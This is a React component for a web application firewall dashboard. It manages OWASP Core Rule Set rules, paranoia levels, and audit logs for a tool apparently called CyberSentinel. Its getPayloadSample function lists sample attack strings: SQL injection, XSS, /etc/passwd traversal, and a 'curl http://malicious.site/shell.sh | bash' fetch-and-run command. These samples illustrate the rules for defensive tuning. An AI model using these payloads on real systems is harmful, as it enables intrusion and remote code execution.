import { useState, useEffect } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Activity, ShieldAlert, ShieldAlert as AlertIcon, AlertTriangle as AlertTriangleIcon,
  ChevronLeft, ChevronRight, Clock, Code, Database, ShieldCheck, Search, X,
} from 'lucide-react';
import {
  getRules, enableRule, disableRule, setParanoiaLevel, getRulesStats, getRulesHistory,
  resetRules, getRuleDetails,
} from '../services/api';
import { formatLocalTime } from '../utils/helpers';
import { HelpText } from '../components/Tooltip';

const CATEGORY_MAP = {
  "901": "Initialization",
  "905": "Common Exceptions",
  "911": "Method Enforcement",
  "913": "Scanner Detection",
  "920": "Protocol Enforcement",
  "921": "Protocol Attack",
  "922": "Multipart Attack",
  "930": "LFI",
  "931": "RFI",
  "932": "RCE",
  "933": "PHP Injection",
  "934": "Generic Attack",
  "941": "XSS",
  "942": "SQL Injection",
  "943": "Session Fixation",
  "944": "Java Injection",
  "949": "Blocking Evaluation",
  "950": "Data Leakage",
  "951": "SQL Leakage",
  "952": "Java Leakage",
  "953": "PHP Leakage",
  "954": "IIS Leakage",
  "955": "Web Shells",
  "956": "Ruby Leakage",
  "959": "Blocking Response",
  "980": "Correlation"
};

export default function Rules({ userRole }) {
  const [rules, setRules] = useState([]);
  const [stats, setStats] = useState({
    total_rules: 0,
    enabled_rules: 0,
    disabled_rules: 0,
    paranoia_level: 1,
    top_triggered_rules: [],
    category_distribution: [],
    tuning_candidates: []
  });
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [total, setTotal] = useState(0);
  const size = 10;

  // Filters state
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('');
  const [severity, setSeverity] = useState('');
  const [statusFilter, setStatusFilter] = useState('');

  // Modals / Drawer state
  const [selectedRule, setSelectedRule] = useState(null);
  const [ruleDetailLoading, setRuleDetailLoading] = useState(false);
  const [detailedRule, setDetailedRule] = useState(null);

  // Rule Disable Confirmation state
  const [ruleToDisable, setRuleToDisable] = useState(null);
  const [disableReason, setDisableReason] = useState('');
  const [disableError, setDisableError] = useState('');

  // Notification states
  const [toast, setToast] = useState(null);

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  const fetchRulesData = async () => {
    setLoading(true);
    try {
      const filters = {};
      if (search) filters.search = search;
      if (category) filters.category = category;
      if (severity) filters.severity = severity;
      if (statusFilter) filters.enabled = statusFilter === 'enabled';

      const [rulesRes, statsRes, historyRes] = await Promise.all([
        getRules(page, size, filters),
        getRulesStats(),
        getRulesHistory()
      ]);

      setRules(rulesRes.data);
      setTotal(rulesRes.total);
      setStats(statsRes);
      setHistory(historyRes);
    } catch (error) {
      console.error("Failed to load WAF rules data:", error);
      showToast("Failed to fetch WAF rules from backend.", "error");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchRulesData();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, category, severity, statusFilter]);

  // Handle Search submit
  const handleSearchSubmit = (e) => {
    e.preventDefault();
    setPage(1);
    fetchRulesData();
  };

  // Inspect rule detail
  const handleInspectRule = async (rule) => {
    setSelectedRule(rule);
    setRuleDetailLoading(true);
    setDetailedRule(null);
    try {
      const detail = await getRuleDetails(rule.id);
      setDetailedRule(detail);
    } catch (error) {
      console.error("Failed to inspect rule details:", error);
      showToast(`Could not load details for rule ${rule.id}`, "error");
    } finally {
      setRuleDetailLoading(false);
    }
  };

  // Toggle rule state (enable directly, show modal overlay for disabling)
  const handleToggleState = async (rule) => {
    if (!rule.enabled) {
      // Enabling rule: execute immediately
      setLoading(true);
      try {
        const res = await enableRule(rule.id);
        showToast(res.message || `Rule ${rule.id} has been enabled successfully.`);
        fetchRulesData();
      } catch (error) {
        showToast(error.message || `Failed to enable rule ${rule.id}`, "error");
        setLoading(false);
      }
    } else {
      // Disabling rule: show confirmation prompt and require a security justification reason
      setRuleToDisable(rule);
      setDisableReason('');
      setDisableError('');
    }
  };

  // Confirm rule disabling override
  const handleConfirmDisable = async () => {
    if (!disableReason || disableReason.trim().length < 3) {
      setDisableError("A valid justification reason is required to proceed.");
      return;
    }

    setLoading(true);
    const targetId = ruleToDisable.id;
    setRuleToDisable(null);

    try {
      const res = await disableRule(targetId, disableReason);
      showToast(res.message || `Rule ${targetId} has been overridden and disabled.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || `Failed to disable rule ${targetId}`, "error");
      setLoading(false);
    }
  };

  // Paranoia Level Change
  const handleParanoiaLevelChange = async (level) => {
    if (level === stats.paranoia_level) return;
    setLoading(true);
    try {
      const res = await setParanoiaLevel(level);
      showToast(res.message || `Global detection paranoia level updated to PL${level}.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to update paranoia level", "error");
      setLoading(false);
    }
  };

  // Restore defaults
  const handleRestoreDefaults = async () => {
    if (!window.confirm("Are you sure you want to restore all OWASP CRS rules and paranoia levels to WAF system defaults?")) {
      return;
    }
    setLoading(true);
    try {
      const res = await resetRules();
      showToast(res.message || "WAF settings restored to system default configuration.");
      setPage(1);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to restore defaults.", "error");
      setLoading(false);
    }
  };

  // Trigger payload sample mapper based on Category
  const getPayloadSample = (cat) => {
    switch (cat) {
      case "SQL Injection": return ["' OR 1=1 --", "UNION SELECT null, username, password FROM users", "admin' --"];
      case "XSS": return ["<script>alert(1)</script>", "<img src=x onerror=alert(document.domain)>", "javascript:alert(1)"];
      case "LFI": return ["../../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", "/proc/self/environ"];
      case "RCE": return ["cat /etc/passwd", "curl http://malicious.site/shell.sh | bash", "; whoami; id"];
      case "Scanner Detection": return ["Nikto Vulnerability Scanner headers", "sqlmap parameter crawls", "nmap script triggers"];
      default: return ["Blocked anomalous traffic payload match.", "Specialized signature match."];
    }
  };

  return (
    <div className="rules-container">
      {/* Toast Alert overlay */}
      <AnimatePresence>
        {toast && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className={`toast-alert ${toast.type === 'error' ? 'error' : 'success'}`}
            style={{
              position: 'fixed',
              top: '24px',
              right: '24px',
              zIndex: 9999,
              padding: '12px 24px',
              borderRadius: '8px',
              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              background: toast.type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 'rgba(16, 185, 129, 0.95)',
              border: '1px solid rgba(255,255,255,0.1)',
              color: '#fff',
              fontWeight: 500
            }}
          >
            <ShieldAlert size={18} />
            <span>{toast.message}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Top Header Card containing metrics summary and paranoia control */}
      <motion.div
        className="glass-panel"
        style={{ padding: '24px', marginBottom: '8px' }}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', flexWrap: 'wrap', gap: '16px' }}>
          <div className="card-title" style={{ margin: 0 }}>
            <ShieldAlert size={20} color="#ef4444" />
            WAF Rule Tuning & Administration
          </div>
          {userRole === 'admin' && (
            <button
              onClick={handleRestoreDefaults}
              className="action-btn-inspect"
              style={{ borderColor: 'rgba(168, 85, 247, 0.3)', color: '#c084fc', background: 'rgba(168, 85, 247, 0.05)' }}
            >
              Reset Overrides
            </button>
          )}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '16px', marginBottom: '24px' }}>
          <div className="metric-box" style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Total CRS Rules</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#f4f4f5', marginTop: '4px' }}>
              {stats.total_rules || rules.length}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(16, 185, 129, 0.02)', border: '1px solid rgba(16, 185, 129, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Active Guards</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#10b981', marginTop: '4px' }}>
              {stats.enabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(239, 68, 68, 0.02)', border: '1px solid rgba(239, 68, 68, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Disabled Tuning Overrides</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#ef4444', marginTop: '4px' }}>
              {stats.disabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(59, 130, 246, 0.02)', border: '1px solid rgba(59, 130, 246, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Paranoia Level</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#3b82f6', marginTop: '4px' }}>
              PL {stats.paranoia_level}
            </div>
          </div>
        </div>

        {/* Paranoia Selector Slider */}
        <div style={{ background: 'rgba(255,255,255,0.01)', padding: '16px 20px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.04)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>OWASP CRS Paranoia Level Setting</div>
              <HelpText>
                Paranoia Level controls how strict the WAF rules are. Level 1 (default) blocks common attacks with minimal false positives. Higher levels add more aggressive rules but may block legitimate traffic. Start with PL1 and increase only if needed.
              </HelpText>
            </div>
            <div style={{ fontSize: '12px', color: '#a1a1aa', marginTop: '2px' }}>Higher paranoia levels add strict rulesets to block advanced attacks but increase risk of false positives.</div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '11px', background: 'rgba(59,130,246,0.1)', color: '#3b82f6', border: '1px solid rgba(59,130,246,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>
              ACTIVE: PL{stats.paranoia_level}
            </span>
          </div>

          <div className="paranoia-selector-wrapper">
            {[
              { level: 1, label: 'PL 1: Default', desc: 'Standard protection. Extremely low risk of false triggers. Recommended for core servers.' },
              { level: 2, label: 'PL 2: Strict', desc: 'Adds advanced syntax checking. Best balance of heavy security and business integrity.' },
              { level: 3, label: 'PL 3: Extreme', desc: 'Strict regex filters enabled. Potential false triggers on highly customized APIs.' },
              { level: 4, label: 'PL 4: Paranoid', desc: 'Defense-in-depth absolute guard. Highly restrictive. Ideal for ultra-secure lock-down APIs.' }
            ].map(item => (
              <button
                key={item.level}
                onClick={() => userRole === 'admin' && handleParanoiaLevelChange(item.level)}
                className={`paranoia-level-btn ${stats.paranoia_level === item.level ? 'active' : ''}`}
                style={userRole !== 'admin' ? { cursor: 'not-allowed', opacity: 0.6 } : {}}
                disabled={userRole !== 'admin'}
                title={userRole !== 'admin' ? "Only administrators can change paranoia level" : ""}
              >
                <div style={{ fontWeight: 600, fontSize: '13px', color: stats.paranoia_level === item.level ? '#3b82f6' : '#e4e4e7' }}>{item.label}</div>
                <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>{item.desc}</div>
              </button>
            ))}
          </div>
        </div>
      </motion.div>

      {/* Main Grid View split into Rules grid and Audits sidebar */}
      <div className="rules-grid-layout">

        {/* Left Side: Rule list database and search filters */}
        <motion.div
          className="glass-panel"
          style={{ padding: '24px' }}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
        >
          <div className="card-title" style={{ marginBottom: '20px' }}>
            <Database size={18} color="#3b82f6" />
            OWASP Core Ruleset Registry
          </div>

          {/* Filters Bar */}
          <form onSubmit={handleSearchSubmit} style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
            <div className="search-input-wrapper" style={{ flex: 1, minWidth: '200px' }}>
              <Search className="search-icon" size={16} style={{ left: '12px' }} />
              <input
                type="text"
                placeholder="Search rule ID, description..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="search-input"
                style={{ width: '100%', paddingLeft: '36px' }}
              />
            </div>

            <select
              value={category}
              onChange={(e) => { setCategory(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Categories</option>
              {Object.values(CATEGORY_MAP).map(cat => (
                <option key={cat} value={cat}>{cat}</option>
              ))}
            </select>

            <select
              value={severity}
              onChange={(e) => { setSeverity(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <select
              value={statusFilter}
              onChange={(e) => { setStatusFilter(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Statuses</option>
              <option value="enabled">Enabled</option>
              <option value="disabled">Disabled Override</option>
            </select>

            <button type="submit" className="modal-btn primary">
              Apply Filter
            </button>
          </form>

          {/* Rules List Container */}
          {loading ? (
            <div style={{ display: 'flex', justifyContent: 'center', padding: '60px 0' }}>
              <div className="spinner"></div>
            </div>
          ) : rules.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px 24px', color: '#a1a1aa' }}>
              <ShieldCheck size={48} style={{ margin: '0 auto 12px', opacity: 0.3, color: '#10b981' }} />
              <h3>No Rules Found</h3>
              <p style={{ fontSize: '13px', marginTop: '6px' }}>Adjust your keyword search or active filter dropdown parameters.</p>
            </div>
          ) : (
            <div className="rules-container">
              {rules.map((rule) => (
                <div
                  key={rule.id}
                  className={`rule-card ${!rule.enabled ? 'disabled' : ''}`}
                >
                  <div className="rule-card-info">
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.08)', padding: '1px 6px', borderRadius: '4px', fontWeight: 600, color: '#f4f4f5' }}>
                        {rule.id}
                      </span>
                      <span style={{ fontWeight: 600, fontSize: '14px', color: rule.enabled ? '#e4e4e7' : '#a1a1aa' }}>{rule.name}</span>

                      {rule.paranoia_level > stats.paranoia_level && (
                        <span style={{ fontSize: '9px', background: 'rgba(234, 179, 8, 0.05)', color: '#eab308', border: '1px solid rgba(234,179,8,0.15)', padding: '1px 5px', borderRadius: '3px', fontWeight: 500 }}>
                          PL {rule.paranoia_level} (Inactive)
                        </span>
                      )}
                    </div>

                    <p style={{ fontSize: '12px', color: '#a1a1aa', margin: '2px 0 6px', lineHeight: '1.4' }}>
                      {rule.description}
                    </p>

                    <div className="rule-card-meta">
                      <span className="category-tag">{rule.category}</span>
                      <span className={`severity-pill ${rule.severity.toLowerCase()}`}>{rule.severity}</span>
                      {rule.hit_count > 0 && (
                        <span style={{ fontSize: '11px', color: '#ef4444', fontWeight: 500, display: 'flex', alignItems: 'center', gap: '4px' }}>
                          <AlertTriangleIcon size={12} />
                          {rule.hit_count} hits recorded
                        </span>
                      )}
                      {rule.last_triggered && (
                        <span style={{ fontSize: '11px', color: '#a1a1aa' }}>
                          Last: {rule.last_triggered}
                        </span>
                      )}
                    </div>
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                    <button
                      onClick={() => handleInspectRule(rule)}
                      className="action-btn-inspect"
                    >
                      Inspect
                    </button>

                    {/* Toggle Guard Switch */}
                    {userRole === 'admin' ? (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        onClick={() => handleToggleState(rule)}
                        style={{ flexShrink: 0 }}
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    ) : (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        style={{ flexShrink: 0, opacity: 0.5, cursor: 'not-allowed' }}
                        title="Only administrators can enable or disable rules"
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Pagination */}
          {!loading && total > size && (
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '24px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
              <span style={{ fontSize: '13px', color: '#a1a1aa' }}>
                Showing <strong>{Math.min(total, (page - 1) * size + 1)}</strong> to <strong>{Math.min(total, page * size)}</strong> of <strong>{total}</strong> rule entries
              </span>
              <div style={{ display: 'flex', gap: '8px' }}>
                <button
                  disabled={page === 1}
                  onClick={() => setPage(p => Math.max(1, p - 1))}
                  className="action-btn-inspect"
                  style={{ opacity: page === 1 ? 0.5 : 1, pointerEvents: page === 1 ? 'none' : 'auto' }}
                >
                  <ChevronLeft size={16} />
                </button>
                <button
                  disabled={page * size >= total}
                  onClick={() => setPage(p => p + 1)}
                  className="action-btn-inspect"
                  style={{ opacity: page * size >= total ? 0.5 : 1, pointerEvents: page * size >= total ? 'none' : 'auto' }}
                >
                  <ChevronRight size={16} />
                </button>
              </div>
            </div>
          )}
        </motion.div>

        {/* Right Side: Tuning Recommendations and CyberSentinel Engine Change History Audits */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>

          {/* Active Tuning Candidates Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Activity size={18} color="#eab308" />
              Tuning Candidates (High Trigger Rates)
            </div>

            {stats.tuning_candidates && stats.tuning_candidates.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {stats.tuning_candidates.map(cand => (
                  <div key={cand.rule_id} style={{ padding: '12px 14px', background: 'rgba(234, 179, 8, 0.02)', border: '1px solid rgba(234, 179, 8, 0.1)', borderRadius: '8px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(234, 179, 8, 0.1)', color: '#eab308', padding: '1px 5px', borderRadius: '4px', fontWeight: 600 }}>
                        {cand.rule_id}
                      </span>
                      <span style={{ fontSize: '12px', color: '#fca5a5', fontWeight: 600 }}>{cand.hit_count} dynamic blocks</span>
                    </div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5' }}>{cand.name}</div>
                    <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>
                      <strong>Recommendation:</strong> {cand.recommendation}
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ textSelf: 'center', textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
                <ShieldCheck size={32} style={{ margin: '0 auto 8px', color: '#10b981', opacity: 0.5 }} />
                No rule overrides recommended. Current trigger rates are stable.
              </div>
            )}
          </motion.div>

          {/* Change Auditing Logs Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Clock size={18} color="#a855f7" />
              Administrative Audit Logs
            </div>

            <div className="audit-list">
              {history.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
                  No changes recorded in overrides database.
                </div>
              ) : (
                history.map((log, index) => (
                  <div className="audit-item" key={index}>
                    <div className="audit-meta-header">
                      <span style={{ fontWeight: 600 }}>@{log.username}</span>
                      <span>{formatLocalTime(log.timestamp)}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <span className={`audit-action-badge ${log.action}`}>
                        {log.action}
                      </span>
                      {log.rule_id && (
                        <span style={{ fontFamily: 'monospace', fontSize: '11px', color: '#a1a1aa' }}>
                          ID: {log.rule_id}
                        </span>
                      )}
                    </div>
                    <div style={{ color: '#e4e4e7', fontSize: '12px', lineHeight: '1.4', marginTop: '2px' }}>
                      {log.details}
                    </div>
                  </div>
                ))
              )}
            </div>
          </motion.div>
        </div>

      </div>

      {/* --- Overlay Modals Drawer for rule inspection --- */}
      {createPortal(
        <AnimatePresence>
          {selectedRule && (
            <div className="modal-overlay" onClick={() => setSelectedRule(null)}>
              <motion.div
                className="modal-content"
                style={{ maxWidth: '850px' }}
                onClick={(e) => e.stopPropagation()}
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
              >
                <div className="modal-header">
                  <div className="modal-title">
                    <ShieldAlert size={20} color="#3b82f6" />
                    <span>Inspect Rule ID: {selectedRule.id}</span>
                  </div>
                  <button className="modal-close-btn" onClick={() => setSelectedRule(null)}>
                    <X size={18} />
                  </button>
                </div>

                <div style={{ padding: '24px', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div>
                    <h3 style={{ margin: '0 0 8px', color: '#f4f4f5' }}>{selectedRule.name}</h3>
                    <p style={{ fontSize: '13px', color: '#a1a1aa', lineHeight: '1.5', margin: 0 }}>
                      {selectedRule.description}
                    </p>
                  </div>

                  <div className="rule-drawer-grid">
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>OWASP Category</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>{selectedRule.category}</div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Severity Level</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', display: 'flex', gap: '6px', alignItems: 'center' }}>
                        <span className={`severity-pill ${selectedRule.severity.toLowerCase()}`} style={{ display: 'inline-block' }}>{selectedRule.severity}</span>
                      </div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>CRS Paranoia Level</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>PL {selectedRule.paranoia_level}</div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Dynamic Logs Blocks</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#ef4444' }}>{selectedRule.hit_count} triggers</div>
                    </div>
                  </div>

                  {/* syntax block */}
                  <div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <Code size={14} color="#3b82f6" />
                      CyberSentinel Engine Configuration Rule Syntax
                    </div>
                    {ruleDetailLoading ? (
                      <div style={{ background: 'rgba(0,0,0,0.2)', padding: '24px', textAlign: 'center', borderRadius: '8px' }}>
                        <div className="spinner" style={{ margin: '0 auto' }}></div>
                      </div>
                    ) : detailedRule ? (
                      <pre className="syntax-box">{detailedRule.syntax}</pre>
                    ) : (
                      <pre className="syntax-box">{selectedRule.syntax}</pre>
                    )}
                  </div>

                  {/* trigger examples */}
                  <div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <Database size={14} color="#10b981" />
                      Simulated Payload / Attack Trigger Examples
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {getPayloadSample(selectedRule.category).map((sample, idx) => (
                        <div key={idx} style={{ background: 'rgba(255,255,255,0.02)', padding: '10px 14px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <code style={{ fontSize: '12px', color: '#fca5a5', fontFamily: 'monospace' }}>{sample}</code>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(sample);
                              showToast("Copied trigger payload to clipboard!");
                            }}
                            className="action-btn-inspect"
                            style={{ padding: '3px 8px', fontSize: '10px' }}
                          >
                            Copy
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* file path */}
                  <div style={{ fontSize: '11px', color: '#a1a1aa', borderTop: '1px solid var(--border-color)', paddingTop: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
                    <strong>VENDOR SOURCE:</strong> {selectedRule.file_path}
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>,
        document.body
      )}

      {/* --- Warn Override Confirmation Overlay for Disabling High/Critical Rules --- */}
      {createPortal(
        <AnimatePresence>
          {ruleToDisable && (
            <div className="modal-overlay" style={{ zIndex: 1100 }}>
              <motion.div
                className="modal-content pulse-warning"
                style={{ maxWidth: '520px', border: '1px solid rgba(239, 68, 68, 0.35)' }}
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
              >
                <div className="modal-header" style={{ background: 'rgba(239, 68, 68, 0.03)', borderBottom: '1px solid rgba(239,68,68,0.15)' }}>
                  <div className="modal-title" style={{ color: '#fca5a5' }}>
                    <AlertIcon size={20} color="#ef4444" />
                    <span>Security Protection Override Warning</span>
                  </div>
                  <button className="modal-close-btn" onClick={() => setRuleToDisable(null)}>
                    <X size={18} />
                  </button>
                </div>

                <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div className="warning-banner" style={{ margin: 0 }}>
                    <AlertTriangleIcon size={24} style={{ flexShrink: 0, marginTop: '2px' }} />
                    <div>
                      <h4 style={{ margin: '0 0 4px', fontWeight: 600 }}>Tuning Protection Override Alert</h4>
                      <p style={{ fontSize: '12px', margin: 0, lineHeight: '1.4' }}>
                        Disabling the rule <strong>{ruleToDisable.id} ({ruleToDisable.severity})</strong> degrades overall WAF security posture. This may leave application entry points vulnerable to SQL Injection, XSS, or RCE exploits.
                      </p>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '13px', fontWeight: 600, color: '#f4f4f5', display: 'block', marginBottom: '8px' }}>
                      Tuning Override Justification <span style={{ color: '#ef4444' }}>*</span>
                    </label>
                    <textarea
                      placeholder="Provide detailed white-listing reason (e.g. White-listing corporate webhook false positive on parameter x)"
                      value={disableReason}
                      onChange={(e) => {
                        setDisableReason(e.target.value);
                        if (e.target.value.trim().length >= 3) setDisableError('');
                      }}
                      style={{
                        width: '100%',
                        height: '80px',
                        background: 'rgba(0,0,0,0.2)',
                        border: '1px solid rgba(255,255,255,0.06)',
                        borderRadius: '8px',
                        padding: '10px 12px',
                        color: '#fff',
                        fontSize: '13px',
                        outline: 'none',
                        resize: 'none'
                      }}
                    />
                    {disableError && (
                      <span style={{ fontSize: '11px', color: '#ef4444', display: 'block', marginTop: '4px' }}>
                        {disableError}
                      </span>
                    )}
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
                    <button
                      onClick={() => setRuleToDisable(null)}
                      className="action-btn-inspect"
                      style={{ background: 'transparent', color: '#a1a1aa', borderColor: 'rgba(255,255,255,0.1)' }}
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleConfirmDisable}
                      className="action-btn-inspect"
                      style={{ background: '#ef4444', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
                    >
                      Confirm Override
                    </button>
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>,
        document.body
      )}

    </div>
  );
}

